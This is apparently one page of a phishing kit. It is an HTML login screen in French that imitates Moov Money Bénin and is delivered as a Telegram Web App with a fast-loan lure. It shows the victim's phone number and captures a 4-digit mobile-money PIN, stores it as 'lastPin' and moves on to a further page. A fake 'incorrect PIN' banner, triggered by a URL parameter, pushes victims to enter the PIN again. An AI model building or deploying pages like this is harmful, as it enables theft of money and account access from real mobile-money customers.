<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money Bénin - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #f26522;
            --moov-blue: #004b87;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body { 
            background-color: #ffffff; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
        }

        .header-box { 
            width: 100%; 
            background: linear-gradient(180deg, var(--moov-blue) 0%, #003865 100%); 
            padding: 30px 20px; 
            color: white; 
            text-align: center; 
            border-bottom: 4px solid var(--moov-orange); 
        }

        .header-title { 
            font-size: 30px; 
            font-weight: 800; 
        }

        .header-title .moov { color: var(--moov-orange); }
        .header-title .money { color: #fff; }

        .main-content { 
            width: 90%; 
            max-width: 400px; 
            margin: 25px auto; 
            text-align: center; 
            flex-grow: 1; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }

        .error-banner {
            background-color: #fde8e8;
            color: #e74c3c;
            border: 1px solid #f8b4b4;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 20px;
            width: 100%;
            display: none;
            text-align: center;
            box-shadow: 0 2px 6px rgba(231, 76, 60, 0.15);
        }

        .phone-display { 
            width: 100%; 
            border: 1.5px solid var(--moov-blue); 
            border-radius: 12px; 
            padding: 14px; 
            display: flex; 
            align-items: center; 
            gap: 12px; 
            margin-bottom: 25px; 
            font-weight: 700; 
            font-size: 18px; 
        }
        
        .pin-input-group { 
            display: flex; 
            gap: 12px; 
            justify-content: center; 
            margin-bottom: 25px; 
        }

        .pin-box { 
            width: 52px; 
            height: 52px; 
            border: 1.5px solid var(--moov-blue); 
            border-radius: 12px; 
            text-align: center; 
            font-size: 22px; 
            font-weight: bold; 
            outline: none; 
        }

        .pin-box:focus {
            border-color: var(--moov-orange);
            box-shadow: 0 0 8px rgba(242, 101, 34, 0.25);
        }
        
        .btn-submit { 
            background-color: #e2e2e2; 
            color: #fff; 
            border: none; 
            width: 100%; 
            padding: 16px; 
            border-radius: 10px; 
            font-size: 16px; 
            font-weight: 800; 
            cursor: not-allowed; 
            text-transform: uppercase;
        }

        .btn-submit.active { 
            background-color: var(--moov-orange); 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="header-box">
    <div class="header-title">
        <span class="moov">Moov</span><span class="money">Money</span>
    </div>
    <div style="font-size:14px; margin-top:5px;">Prêts Rapides & Sécurisés</div>
</div>

<div class="main-content">
    <h2>Connexion</h2>

    <!-- Dynamic Notification Banner for Wrong PIN -->
    <div id="errorDisplay" class="error-banner">
        ⚠️ Code PIN incorrect. Veuillez réessayer.
    </div>

    <div class="phone-display">
        <span>🇧🇯</span>
        <span>+229</span>
        <span id="displayPhone">--</span>
    </div>

    <p style="color:#666; font-size:14px; margin-bottom:15px;">Entrez votre code PIN</p>

    <div class="pin-input-group">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
    </div>

    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const errorDisplay = document.getElementById('errorDisplay');
    const displayPhone = document.getElementById('displayPhone');

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "97000000";
    displayPhone.textContent = savedPhone;

    // Check if redirected due to incorrect PIN error
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.style.display = "block";
    }

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');

            if (box.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }

            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value.length === 1);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    loginBtn.addEventListener('click', () => {
        if (loginBtn.disabled) return;

        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);

        errorDisplay.style.display = "none";
        window.location.href = "/page7";
    });

    pinBoxes[0].focus();
});
</script>
</body>
</html>
